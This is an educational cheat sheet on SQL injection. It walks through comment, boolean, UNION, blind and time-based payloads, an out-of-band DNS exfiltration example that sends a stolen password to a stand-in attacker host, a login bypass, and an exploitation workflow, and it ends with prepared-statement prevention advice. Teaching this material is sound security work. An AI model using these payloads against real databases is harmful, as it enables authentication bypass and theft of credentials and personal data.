# What is SQL Injection ?

## 1. What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with SQL queries that an application makes to its database.

If user input is inserted directly into a SQL query without proper sanitization or parameterization, an attacker can manipulate the query structure.

This can allow the attacker to:

* Retrieve sensitive data (passwords, credit cards, PII)
* Bypass authentication
* Modify or delete database data
* Escalate privileges
* In some cases, compromise the underlying server

***

## 2. How SQL Injection Happens

Consider a URL:

```
/products?category=Gifts
```

Backend query:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

If the application concatenates user input directly:

```
String query = "SELECT * FROM products WHERE category = '" + input + "'";
```

This becomes vulnerable.

***

## 3. Basic SQL Injection Examples

### 3.1 Comment Injection

Input:

```
Gifts'--
```

Query becomes:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;
```

`--` comments out the rest of the query.

Effective query:

```
SELECT * FROM products WHERE category = 'Gifts';
```

This removes the `released = 1` restriction.

***

### 3.2 Boolean Injection

Input:

```
Gifts' OR 1=1--
```

Query becomes:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--;
```

Since `1=1` is always true, the query returns all products.

***

## 4. Login Bypass (Subverting Application Logic)

Original query:

```
SELECT * FROM users WHERE username = 'administrator' AND password = '123';
```

Injection:

```
administrator'--
```

Query becomes:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
```

Effective query:

```
SELECT * FROM users WHERE username = 'administrator';
```

Password check is removed → authentication bypass.

***

## 5. UNION-Based SQL Injection

When query results are reflected in the response, UNION can be used.

Original query:

```
SELECT name, description FROM products WHERE category = 'Gifts';
```

Injection:

```
' UNION SELECT username, password FROM users--
```

Final query:

```
SELECT name, description FROM products WHERE category='Gifts'
UNION
SELECT username, password FROM users--;
```

Sensitive data is appended to the response.

***

### 5.1 Requirements for UNION Attack

1. Same number of columns
2. Compatible data types

***

### 5.2 Finding Number of Columns

#### Method 1 – ORDER BY

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

If `ORDER BY 3` fails, query has 2 columns.

***

#### Method 2 – NULL Technique

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

When number of NULLs matches original columns → no error.

***

### 5.3 Finding String Columns

Example (4 columns):

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
```

If `'a'` appears in response → that column supports string.

***

### 5.4 Dumping Data

If 2 string columns exist:

```
' UNION SELECT username, password FROM users--
```

***

### 5.5 Single Column Case (Concatenation)

If original query returns only one column:

Oracle/PostgreSQL:

```
' UNION SELECT username || ':' || password FROM users--
```

MySQL:

```
' UNION SELECT CONCAT(username,':',password) FROM users--
```

MSSQL:

```
' UNION SELECT username + ':' + password FROM users--
```

***

## 6. Blind SQL Injection

Blind SQLi occurs when:

* Query results are not visible
* No SQL errors are shown

Only behavioral differences can be observed.

***

### 6.1 Boolean-Based Blind SQLi

Example:

```
xyz' AND '1'='1
xyz' AND '1'='2
```

If first shows “Welcome back” and second does not → injectable.

#### Extracting Data

```
xyz' AND SUBSTRING(
(SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s
```

If true → response changes.

Extract character-by-character.

***

### 6.2 Error-Based Blind SQLi

Trigger conditional errors:

```
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

If condition true → divide by zero error.

Use this to extract data.

***

### 6.3 Time-Based Blind SQLi

MSSQL example:

```
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

If delay occurs → condition true.

Password extraction:

```
'; IF (SELECT COUNT(*) FROM Users 
WHERE Username='Administrator' 
AND SUBSTRING(Password,1,1)='s')=1 
WAITFOR DELAY '0:0:5'--
```

***

### 6.4 OAST (Out-of-Band SQLi)

Used when:

* No response difference
* No error difference
* No time difference

MSSQL DNS example:

```
'; exec master..xp_dirtree 
'//attacker.burpcollaborator.net/a'--
```

Server makes DNS request.

Data exfiltration example:

```
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.attacker.net/a"')--
```

Password appears in DNS query.

***

## 7. Database Enumeration

### 7.1 Detect Database Version

Assume We Have a Two Column !!

MySQL / MSSQL:

```
' UNION SELECT @@version, NULL--
```

PostgreSQL:

```
' UNION SELECT version(), NULL--
```

Oracle:

```
' UNION SELECT banner, NULL FROM v$version--     
```

***

### 7.2 List Tables

Non-Oracle:

```
SELECT * FROM information_schema.tables;
```

List columns:

```
SELECT * FROM information_schema.columns 
WHERE table_name='users';
```

Oracle:

```
SELECT * FROM all_tables;
SELECT * FROM all_tab_columns WHERE table_name='USERS';
```

***

## 8. Second-Order SQL Injection

First-order SQLi:\
User input → immediately executed in SQL query.

Second-order SQLi:\
User input is stored in database safely.\
Later, stored input is used unsafely in another query.

This is also called stored SQL injection.

***

## 9. Database-Specific Differences

| Feature | MySQL    | MSSQL         | PostgreSQL   | Oracle           |
| ------- | -------- | ------------- | ------------ | ---------------- |
| Comment | -- #     | --            | --           | --               |
| Sleep   | SLEEP(5) | WAITFOR DELAY | pg\_sleep(5) | DBMS\_LOCK.SLEEP |
| Concat  | CONCAT() | +             |              |                  |

***

## 10. Prevention of SQL Injection

### 10.1 Vulnerable Code

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
```

### 10.2 Secure Code (Prepared Statement)

```
PreparedStatement statement = connection.prepareStatement(
"SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
```

Prepared statements ensure:

* User input cannot modify query structure
* Input treated strictly as data

***

### Important Security Rules

* Never concatenate user input into SQL
* Always use parameterized queries
* Use least-privileged DB accounts
* Whitelist table/column names if dynamic
* Avoid verbose error messages in production

***

## 11. Full SQLi Exploitation Workflow

1. Confirm injection
2. Identify injection type (visible/blind)
3. Find column count
4. Identify string columns
5. Detect database version
6. Enumerate tables
7. Enumerate columns
8. Extract sensitive data
9. Escalate if possible

***
